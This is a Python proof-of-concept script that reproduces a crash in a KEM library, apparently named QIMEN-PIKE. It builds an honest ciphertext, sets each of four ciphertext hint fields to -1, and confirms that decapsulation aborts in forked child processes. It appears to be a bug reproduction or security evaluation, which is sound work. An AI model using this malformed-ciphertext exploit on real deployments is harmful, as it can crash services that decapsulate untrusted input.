#!/usr/bin/env python3
"""Reproduce QIMEN-PIKE's negative ciphertext-hint table index."""

import ctypes
import os
import struct
import sys
from pathlib import Path


FP2_ENCODED_BYTES = {"1": 128, "2": 192, "3": 384}


def load(path: str):
    library = ctypes.CDLL(path)
    for name in ("pk", "sk", "ct", "ss"):
        getattr(library, f"kem_get_{name}_len_bytes").restype = ctypes.c_ulonglong
    return library


def sizes(library):
    return {
        name: getattr(library, f"kem_get_{name}_len_bytes")()
        for name in ("pk", "sk", "ct", "ss")
    }


def honest_ciphertext(library):
    seed = (ctypes.c_ubyte * 48)(*range(48))
    assert library.ngcc_seed(seed, len(seed)) == 0
    length = sizes(library)
    pk, sk = (ctypes.c_ubyte * length["pk"])(), (ctypes.c_ubyte * length["sk"])()
    pkn, skn = ctypes.c_ulonglong(length["pk"]), ctypes.c_ulonglong(length["sk"])
    assert library.kem_keygen(pk, ctypes.byref(pkn), sk, ctypes.byref(skn)) == 0
    ct, ss = (ctypes.c_ubyte * length["ct"])(), (ctypes.c_ubyte * length["ss"])()
    ctn, ssn = ctypes.c_ulonglong(length["ct"]), ctypes.c_ulonglong(length["ss"])
    assert library.kem_enc(pk, pkn, ss, ctypes.byref(ssn), ct, ctypes.byref(ctn)) == 0
    return bytes(sk), bytes(ct)


def decapsulate(path: str, sk: bytes, ct: bytes) -> int:
    library = load(path)
    skb = (ctypes.c_ubyte * len(sk))(*sk)
    ctb = (ctypes.c_ubyte * len(ct))(*ct)
    ss = (ctypes.c_ubyte * sizes(library)["ss"])()
    ssn = ctypes.c_ulonglong(len(ss))
    return library.kem_dec(skb, len(sk), ctb, len(ct), ss, ctypes.byref(ssn))


def child_status(path: str, sk: bytes, ct: bytes) -> int:
    pid = os.fork()
    if pid == 0:
        os.execv(
            sys.executable,
            [sys.executable, __file__, "--child", path, sk.hex(), ct.hex()],
        )
        os._exit(127)
    return os.waitpid(pid, 0)[1]


def main() -> None:
    if len(sys.argv) == 5 and sys.argv[1] == "--child":
        rc = decapsulate(sys.argv[2], bytes.fromhex(sys.argv[3]), bytes.fromhex(sys.argv[4]))
        print(f"return_code {rc}", flush=True)
        raise SystemExit(0)

    if len(sys.argv) != 3 or sys.argv[2] not in FP2_ENCODED_BYTES:
        raise SystemExit(f"usage: {Path(sys.argv[0]).name} LIBRARY LEVEL")

    path, level = sys.argv[1:]
    library = load(path)
    sk, ct = honest_ciphertext(library)
    assert decapsulate(path, sk, ct) == 0
    base = 4 * FP2_ENCODED_BYTES[level]
    honest_hints = struct.unpack_from("<4i", ct, base)
    crashes = 0
    for which in range(4):
        mutated = bytearray(ct)
        struct.pack_into("<i", mutated, base + 4 * which, -1)
        status = child_status(path, sk, bytes(mutated))
        if os.WIFSIGNALED(status):
            crashes += 1
        else:
            raise RuntimeError(
                f"hint[{which}] returned normally with exit {os.WEXITSTATUS(status)}"
            )

    assert crashes == 4
    print(
        f"ATTACK kem-31-1 {Path(path).name} CONFIRMED: "
        f"all four -1 hints abort or crash (honest hints {honest_hints})"
    )


if __name__ == "__main__":
    main()
